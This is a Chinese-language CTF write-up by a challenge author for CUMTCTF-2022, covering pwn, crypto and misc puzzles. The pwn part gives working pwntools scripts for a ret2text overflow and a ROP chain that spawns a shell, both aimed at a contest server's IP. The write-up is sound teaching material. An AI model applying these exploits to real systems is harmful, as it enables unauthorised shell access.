---
title: CUMTCTF-2022出题部分wp
date: 2022-6-8 12:04:04
tags: [CTF,Pwn,Crypto,Misc,Python]
categories: 
 - [CyberSecurity,CTF]
cover: https://res.cloudinary.com/sycamore/image/upload/v1682435935/Typera/2023/04/54a2923a541fe0c86555a91b264f4221.png
---

## PWN

### nc

这题就不说了吧，连上啥都有，我连要用到的命令解释都给了~

![image-20230426013827815](https://res.cloudinary.com/sycamore/image/upload/v1682444312/Typera/2023/04/6c7177a450f396a3cc1df92db2cec62b.png)
### ret2text
看一下保护：
![image-20230426013852620](https://res.cloudinary.com/sycamore/image/upload/v1682444337/Typera/2023/04/8810580d090cd91812198696d7ddb02d.png)
主函数：
![image-20230426013952537](https://res.cloudinary.com/sycamore/image/upload/v1682444396/Typera/2023/04/b70fb5e227640f018d72822fc557ad7e.png)
后门函数：
![image-20230426013957304](https://res.cloudinary.com/sycamore/image/upload/v1682444400/Typera/2023/04/217429008da529ab0c39ef4f51553b97.png)

栈溢出就行，一张好图理解一下：
![image-20230426014002698](https://res.cloudinary.com/sycamore/image/upload/v1682444407/Typera/2023/04/f1fddeaa3a59bd82ab8dbb7032f73399.png)

思路：用 ‘a' 覆盖 buf 一直到覆盖上ebp，然后将 ret(返回地址) 的地方写入为后门函数的地址。

双击左侧栏的backdoor函数，右侧能找到函数地址如图：
![image-20230426014006566](https://res.cloudinary.com/sycamore/image/upload/v1682444409/Typera/2023/04/0462346171ca0ff7f93c6db0364f57de.png)

直接照思路这么写，能打通本地，但是会打不通远程，因为栈帧没有平衡（hint），这时候中间插个 retn 的 gadget 就能解决。

随便找个retn的地址
这个就能用：

最后，脚本如下（环境没关，可以继续打远程）：![image-20230426014010146](https://res.cloudinary.com/sycamore/image/upload/v1682444413/Typera/2023/04/d5ad6da67403e757b9bc721f47816524.png)

```python
from pwn import *

#r=process(b'./ret2text')
r=remote(b'106.15.52.194',10002)
backdoor=0x4011DD
retn=0x401203
p=b'a'*40+p64(retn)+p64(backdoor)
r.sendlineafter(b'2022!',p)

r.interactive()
```
### overflow
保护和之前ret2text的一样，
同样可以使用栈溢出漏洞，但是没有一个写好的 backdoor 函数了。

shift+F12 查看字符串，能找到 /bin/sh ，双击得到地址为：0x404050
左侧也能找到 system() 函数，
这时我们可以通过 rop 将 /bin/sh 装入system() 函数中来 getshell。

具体ROP时什么东西可以自行搜索，这里详细说一下怎么利用，
有了system，有了 /bin/sh，唯一的问题就是传参了（因为 我们要的是system("/bin/sh")，要把 /bin/sh 当作参数传到 system 执行嘛），
我们可以用 rop 做到这一点：
64位程序通过寄存器存放参数，所以我们可以用 pop rdi 将 /bin/sh 字串的地址压入rdi，然后 ret，再把 esp 指向 system() 函数地址执行就能 getshell 了。

所以，我们只需要用到 pop rdi ret 一个 gadget，用ROPgadget工具搜索一下就能得到地址，命令如下：
`ROPgadget --binary overflow --only "pop|ret"`

最后还有平衡栈帧的问题注意一下，脚本如下：
```python
from pwn import *

#r = process('./overflow')
r=remote(b'106.15.52.194',10001)
pop_rdi=0x4012e3
bin_sh=0x404050
system=0x401090
retn=0x40101a
p=b'a'*11 + p64(pop_rdi) + p64(bin_sh) + p64(retn) + p64(system)
r.sendlineafter(b'name?\n',p)

r.interactive()
```

## Crypto
### Caesar
简单的凯撒加密...
写个脚本遍历，或者网上找个线上的解密网站一位位地试，或者你能直接猜出来内容，都行...
贴个遍历所有结果的脚本：
```python
model = "abcdefghijklmnopqrstuvwxyz"
model2 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

str1 = "Fdhvdu_lv_wrr_Hdcb"

for key in range(1,27):
    for s in str1:
        if s.islower():
            n = model.find(s)
            s = model[n-key]
        elif s.isupper():
            n = model2.find(s)
            s = model2[n-key]
        print(s, end='')
    print('')
```
得到 flag 内容为 Caesar_is_too_Eazy
（不觉着放眼望去只有这个能读通吗？）

### Caesar？
凯撒+栅栏
密文：fwid_huqifxf{vFv_ghhpwHbddd_q}
结合题目知道这不是简单的凯撒，观察密文结构，仔细观察{}和 _ 的位置，基本能猜到是栅栏吧。。。

用上题脚本遍历，挑出 f、c、b 开头的字串逐一尝试栅栏解密，可以得到最终的 flag
（因为栅栏不会改变第一个字母，所以分别是 flag、cumtctf、bxsctf，逐一尝试即可）。
虽然理论上来说两个解密的顺序反一反都能出，但这样更好解一点...

ps：栅栏每组字数为 3

## Misc
### fifo & lru & opt
本来还想放提示，没想到做出来的人挺多。
关于这三个算法，[这篇博客](https://houbb.github.io/2020/10/04/os-10-page-exchange)上都有了，就不多赘述了。
如果感兴趣的话，其他相关的算法这篇博客上也都有，挺全面的。

fifo算法内存状态为：
 1  2  1  3  2  2  6  6  7  2  1  2  7  2  6
 1  1  1  1  1  1  1  1  7  7  7  7  7  7  7
     2  2  2  2  2  2  2  2  2  1  1  1  1  1
             3  3  3  3  3  3  3  3  2  2  2  2
                         6  6  6  6  6  6  6  6  6
调入队列为 1  2  3  6  7  1  2

lru算法内存状态为：
 1  2  1  3  2  2  6  6  7  2  1  2  7  2  6
 1  1  1  1  1  1  1  1  7  7  7  7  7  7  7
     2  2  2  2  2  2  2  2  2  2  2  2  2  2
             3  3  3  3  3  3  3  1  1  1  1  1
                         6  6  6  6  6  6  6  6  6
调入队列为 1  2  3  6  7  1

opt算法内存状态为：
 1  2  1  3  2  2  6  6  7  2  1  2  7  2  6
 1  1  1  1  1  1  1  1  1  1  1  1  1  1  1
     2  2  2  2  2  2  2  2  2  2  2  2  2  2
             3  3  3  3  3  7  7  7  7  7  7  7
                         6  6  6  6  6  6  6  6  6
调入队列为 1  2  3  6  7
三者连起来得到flag：cumtctf{123671212367112367}

### 套！
这道题，说实话就是拿来娱乐一下，送送分的 (/▽＼)...
分三步：
1. 新约佛论禅（[解密网址](http://hi.pcmoe.net/buddha.html)）
2. Ook!（[Brainfuck / Ook!](https://tool.ysneko.com/brainfuck/)）
3. Brainfuck（网址与Ook一样）

### 左&右
音频隐写
一个原音频（Counting_Stars.wav），一个修改过的（out.wav）

我出题的过程：把flag加密成摩斯密码，把摩斯密码分成两部分，用脚本输出为摩斯电码音频，左右声道分别和原音频相加，同时右声道反向。
因为左右声道藏的内容不太一样，所以不能直接相加...

用 Audacity 打开两个音频，放大查看如下（还是挺明显的吧）：
![image-20230426014027631](https://res.cloudinary.com/sycamore/image/upload/v1682444431/Typera/2023/04/58af7c321f6bb65d3a0870493389096c.png)
所以，得到摩斯的方法：out的左声道 - 原音频左声道，可得前半部分flag，out的右声道 + 原音频右声道，可得后半部分flag

至于怎么加怎么减，我是使用 python 写的脚本，当然还有其他方法（比如有个同学使用的 Au，我是真没想到可以这么解），
不过个人觉着都可以试着用 python 写写看，这样以后遇到类似的题目，即使可能用不了其他的方法，或许你也可以用 python 解决。
```python
import wave
import struct
ori = wave.open("Counting_Stars.wav",'rb')	# 原音频
out = wave.open("out.wav",'rb')				# 隐写音频
exp = wave.open("exp.wav",'wb')				# 处理过后得到的摩斯电码音频
exp.setnchannels(2)			# 设置声道数为2
exp.setsampwidth(2)			# 设置量化位数为2
exp.setframerate(44100)		# 设置采样频率为44100
for i in range(out.getnframes()):			# 一帧帧地读取数据
	lori,rori=struct.unpack('hh', ori.readframes(1))	# 原音频左右声道数据分别存入lori、rori
	lout,rout=struct.unpack('hh', out.readframes(1))
	lexp = lout - lori		# 左声道相减，存入lexp
	rexp = rout + rori
	exp.writeframes(struct.pack('hh',lexp,rexp))		# 把lexp、rexp的数据打包后存入exp.wav
```
解出 exp.wav 之后，去摩斯解密的网站解密即可得到 flag 的内容。

### 嘿嘿，压缩包？
简单的 LSB + ZIP 压缩包 + SSTV

给了一张图和一个压缩包，
注意图片的名字是hint.png。。。

stegsolve打开，LSB隐写能看到提示信息：
1.Plaintext_Attack 2. zSdL#Z7oym!9j8m3

第一个提示明文攻击，第二个是密码
（可能是我的密码设置的有问题？最后一位是3，可能有点迷惑性...）

打开压缩包，里面有一个名字一样的图片，用同样的压缩算法压缩已知图片，观察二者的CRC校验码一致，结合之前的提示，用 ARCHPR 使用明文攻击解开
（这里出 bug 了，最后压缩的时候放错了一个压缩包，导致明文攻击失败，现文件已更新）
明文攻击后，可以获得压缩包flag.zip，可使用之前 LSB 得到的密码解开.

解开后，获得音频文件flag.wav，可以听出来是SSTV  （。＾▽＾）

最后，使用 robot36 解码SSTV音频，可以解出图片如下：
![image-20230426014034071](https://res.cloudinary.com/sycamore/image/upload/v1682444438/Typera/2023/04/d80937655349012b4803de6fadc1e8de.png)
（robot36 为安卓端软件)

扫码得到 flag

### 12_bubu_cli
nc 81.68.81.111 2333
输出如下：
![image-20230426014040530](https://res.cloudinary.com/sycamore/image/upload/v1682444445/Typera/2023/04/9aacfad409013817db6c5378063a2777.png)

先仔细观察一下输出的东西，在命令行里，我们可以发现，输出的是一些带颜色的数字 9，这些数字 9 组成了一张张的图片。（应该能看出来是几张图片，对吧）

然后我们把输出的内容保存到文本文件里查看：nc 81.68.81.111 2333 > 1.txt
大致内容如下：
![image-20230426014048819](https://res.cloudinary.com/sycamore/image/upload/v1682444454/Typera/2023/04/8032d3085f735ce7f02fb11e33c5ca60.png)

可以看到，`<0x1b>[`（即 `\x1b[`）将文本分割成了很多组，这就是 ANSI 转义字符。

ANSI转义字符用 `ESC[`打头，而`ESC`用ASCII码表示为`\x1b`（十六进制的`1b`）

涉及到的转义字符**解释**：
`\x1b[nA`：光标上移n行
`\x1b[38;`：设置前景色，后跟 `5;n`代表使用8位256颜色码，后跟 `2;r;g;b`代表24位RGB颜色码；后接m加字符，即为显示的字符

比如`\x1b[38;2;0;0;0m5`，就是输出黑色的 5.

该文件里的输出都是使用`\x1b[38;2;r;g;bm9`，
也就是说，我们只要提取出这些字符中间的 r g b 三位，然后用 PIL 组合成图片就行了。

除此之外，我们还可以注意到：基本上每隔一段字符，会出现固定长度的一串`\x1b[nA`，
从上述的解释中，我们已经可以知道，这是让光标上移的转义字符，
因此，我们大概能够知晓，输出的图片应该就是被这些字符分割的。

所以，我们可以推断出，图片的长度应该是`\x1b[nA`字符的个数 -1，
从而我们获得了图片的长度为200，
同样的，我们也可以通过统计一行上`\x1b[38;`字符的个数，确定宽度也为200.
（这两个数据都是使用 PIL 生成图片时必须的）

转换脚本如下：
```python
import re
from PIL import Image

with open("1.txt", "r") as fp:
    farmes = fp.read().split("\x1b[A"*201)

i = 0
farmes.pop(0)
for frame in farmes:
    rgb_list = re.findall(r"\[38;2;(\d*);(\d*);(\d*)m", frame)
    # print(frame)
    img = Image.new("RGB", (200,200))
    for w in range(img.size[0]):
        for h in range(img.size[1]):
            r, g, b = rgb_list[h*200 + w]
            img.putpixel((w, h), (int(r), int(g), int(b)))
    img.save(f"frame/{str(i).zfill(4)}.png")
    print(f"Saved frame/{str(i).zfill(4)}.png")
    i += 1
```

现在我们仔细观察一下获得的29张图片：
![image-20230426014102173](https://res.cloudinary.com/sycamore/image/upload/v1682444466/Typera/2023/04/fb1417256ebdb703f6b023d21836f2bf.png)

放大细看，可以发现，大部分图片上都有几个随机出现白点：
![image-20230426014119100](https://res.cloudinary.com/sycamore/image/upload/v1682444483/Typera/2023/04/02f03d1a519726d4487be9f6f0e3ea8d.png)

无论你是用 ps 还是 画图 或者是其他什么工具查看这些白点的像素，你都会发现它们的RGB为（233,233,233）

接下来的思路是：把29张图中RGB为（233,233,233）的点提取出来，组成一张新图。
脚本如下：
```python
from PIL import Image

flag_img=Image.new('RGB',(200,200))
for name in range(0,29):
    img = Image.open(f"frame/{str(name).zfill(4)}.png")
    img = img.convert("RGB")
    for w in range(img.size[0]):
        for h in range(img.size[1]):
            if img.getpixel((w,h)) == (233,233,233):
                flag_img.putpixel((w,h),(233,233,233))

flag_img.save('flag.png')
```
获得的图片如下：
![cumtctf2022wp14](https://res.cloudinary.com/sycamore/image/upload/v1682444530/Typera/2023/04/0abbeb74a9829e5975738dce464003bf.png)
